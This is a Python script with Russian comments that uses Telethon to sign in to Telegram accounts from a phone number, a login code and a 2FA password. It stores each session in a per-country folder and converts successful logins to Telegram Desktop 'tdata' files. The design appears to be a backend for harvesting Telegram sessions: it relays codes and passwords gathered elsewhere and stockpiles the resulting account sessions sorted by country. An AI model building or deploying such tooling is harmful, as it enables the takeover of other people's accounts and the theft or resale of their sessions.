import os
import json
from pathlib import Path
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from convert_sessions import convert_session_to_tdata  # наша функция конверсии
import asyncio

load_dotenv()

API_ID = int(os.getenv('TELEGRAM_API_ID', '12345'))
API_HASH = os.getenv('TELEGRAM_API_HASH', 'your_api_hash')

# Папка для хранения tdata (вместо сессий)
TDATAS_DIR = Path(__file__).resolve().parent / 'tdatas'
TDATAS_DIR.mkdir(parents=True, exist_ok=True)

SESSION_DIR = Path(__file__).resolve().parent / 'sessions'
SESSION_DIR.mkdir(parents=True, exist_ok=True)

# Маппинг кодов стран на двухбуквенные коды
COUNTRY_CODE_MAP = {
    '+1': 'us',      # USA
    '+7': 'ru',      # Russia
    '+44': 'uk',     # UK
    '+33': 'fr',     # France
    '+49': 'de',     # Germany
    '+39': 'it',     # Italy
    '+34': 'es',     # Spain
    '+31': 'nl',     # Netherlands
    '+32': 'be',     # Belgium
    '+43': 'at',     # Austria
    '+41': 'ch',     # Switzerland
    '+46': 'se',     # Sweden
    '+45': 'dk',     # Denmark
    '+47': 'no',     # Norway
    '+358': 'fi',    # Finland
    '+48': 'pl',     # Poland
    '+30': 'gr',     # Greece
    '+90': 'tr',     # Turkey
    '+86': 'cn',     # China
    '+81': 'jp',     # Japan
    '+82': 'kr',     # South Korea
    '+91': 'in',     # India
    '+65': 'sg',     # Singapore
    '+60': 'my',     # Malaysia
    '+62': 'id',     # Indonesia
    '+66': 'th',     # Thailand
    '+84': 'vn',     # Vietnam
    '+61': 'au',     # Australia
    '+64': 'nz',     # New Zealand
    '+27': 'za',     # South Africa
    '+234': 'ng',    # Nigeria
    '+20': 'eg',     # Egypt
    '+55': 'br',     # Brazil
    '+52': 'mx',     # Mexico
    '+54': 'ar',     # Argentina
    '+56': 'cl',     # Chile
    '+57': 'co',     # Colombia
}


def get_country_code(phone: str) -> str:
    """Получить двухбуквенный код страны из кода телефона"""
    for country_code, country_short in COUNTRY_CODE_MAP.items():
        if phone.startswith(country_code):
            return country_short
    return 'unknown'


def get_session_dir_for_country(country_code: str) -> Path:
    """Получить папку сессий для страны"""
    sessions_country_dir = SESSION_DIR / country_code
    sessions_country_dir.mkdir(parents=True, exist_ok=True)
    return sessions_country_dir


def get_tdata_dir_for_country(country_code: str) -> Path:
    """Получить папку tdata для страны"""
    tdata_country_dir = TDATAS_DIR / country_code
    tdata_country_dir.mkdir(parents=True, exist_ok=True)
    return tdata_country_dir


async def send_code(phone: str):
    """Отправка кода на телефон"""
    try:
        # Валидация номера телефона
        if not phone or len(phone) < 10:
            return {'success': False, 'error': 'invalid_phone', 'message': 'Invalid phone number'}
        
        country_code = get_country_code(phone)
        session_dir = get_session_dir_for_country(country_code)
        phone_clean = phone.replace("+", "")
        session_file = session_dir / f'{phone_clean}.session'
        
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await client.disconnect()
            # Удаляем файл сессии если юзер уже авторизован
            if session_file.exists():
                session_file.unlink()
            return {'success': False, 'error': 'already_authorized', 'message': 'User already authorized'}

        result = await client.send_code_request(phone)
        await client.disconnect()

        return {'success': True, 'phone_code_hash': result.phone_code_hash, 'message': 'Code sent'}
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'invalid_phone', 'message': 'Invalid phone number format'}
    except Exception as e:
        return {'success': False, 'error': 'send_code_failed', 'message': str(e)}


async def verify_code(phone: str, code: str, phone_code_hash: str):
    """Проверка кода подтверждения"""
    try:
        # Валидация входных данных
        if not phone or not code or not phone_code_hash:
            return {'success': False, 'error': 'invalid_input', 'message': 'Missing required fields'}
        
        if len(code) != 5 or not code.isdigit():
            return {'success': False, 'error': 'invalid_code', 'message': 'Invalid code format'}
        
        country_code = get_country_code(phone)
        session_dir = get_session_dir_for_country(country_code)
        phone_clean = phone.replace("+", "")
        session_file = session_dir / f'{phone_clean}.session'
        
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            await client.disconnect()

            # Конвертация в tdata только при успешной авторизации
            tdata_dir = get_tdata_dir_for_country(country_code)
            tdata_result = await convert_session_to_tdata(
                phone_clean, 
                str(session_file), 
                API_ID, 
                API_HASH,
                output_dir=str(tdata_dir),
                country_code=country_code
            )

            resp = {
                'success': True,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'message': 'Signed in successfully',
                'tdata': tdata_result
            }
            return resp
        except PhoneCodeInvalidError:
            await client.disconnect()
            # Код неправильный - это ошибка валидации, сессия остается для повтора
            return {'success': False, 'error': 'invalid_code', 'message': 'Invalid or expired code'}
        except SessionPasswordNeededError:
            await client.disconnect()
            # Сессия остается для следующего шага (пароль)
            return {'success': False, 'error': 'password_needed', 'message': '2FA required'}

    except Exception as e:
        return {'success': False, 'error': 'verify_code_failed', 'message': str(e)}


async def verify_password(phone: str, password: str, phone_code_hash: str, code: str):
    """Проверка 2FA пароля"""
    try:
        # Валидация входных данных
        if not phone or not password:
            return {'success': False, 'error': 'invalid_input', 'message': 'Missing required fields'}
        
        if len(password) < 1:
            return {'success': False, 'error': 'invalid_password', 'message': 'Password cannot be empty'}
        
        country_code = get_country_code(phone)
        session_dir = get_session_dir_for_country(country_code)
        phone_clean = phone.replace("+", "")
        session_file = session_dir / f'{phone_clean}.session'
        
        if not session_file.exists():
            return {'success': False, 'error': 'session_not_found', 'message': 'Session not found. Please start over.'}
        
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            await client.disconnect()

            # Конвертация в tdata только при успешной авторизации
            tdata_dir = get_tdata_dir_for_country(country_code)
            tdata_result = await convert_session_to_tdata(
                phone_clean,
                str(session_file),
                API_ID,
                API_HASH,
                output_dir=str(tdata_dir),
                country_code=country_code
            )

            resp = {
                'success': True,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'message': 'Signed in with 2FA successfully',
                'tdata': tdata_result
            }
            return resp
        except Exception as pwd_error:
            await client.disconnect()
            # Пароль неправильный - это ошибка валидации, сессия остается для повтора
            return {'success': False, 'error': 'invalid_password', 'message': 'Invalid password'}

    except Exception as e:
        return {'success': False, 'error': 'verify_password_failed', 'message': str(e)}


if __name__ == '__main__':
    # Для тестирования из командной строки
    import sys

    if len(sys.argv) > 1:
        action = sys.argv[1]
        phone = sys.argv[2] if len(sys.argv) > 2 else None

        if action == 'send_code':
            result = asyncio.run(send_code(phone))
            print(json.dumps(result, ensure_ascii=False))

        elif action == 'verify_code':
            # expect: auth.py verify_code <phone> <code> <phone_code_hash>
            code = sys.argv[3] if len(sys.argv) > 3 else None
            phone_code_hash = sys.argv[4] if len(sys.argv) > 4 else None
            result = asyncio.run(verify_code(phone, code, phone_code_hash))
            print(json.dumps(result, ensure_ascii=False))

        elif action == 'verify_password':
            # expect: auth.py verify_password <phone> <password> <phone_code_hash> <code_optional>
            password = sys.argv[3] if len(sys.argv) > 3 else None
            phone_code_hash = sys.argv[4] if len(sys.argv) > 4 else None
            code2 = sys.argv[5] if len(sys.argv) > 5 else None
            result = asyncio.run(verify_password(phone, password, phone_code_hash, code2))
            print(json.dumps(result, ensure_ascii=False))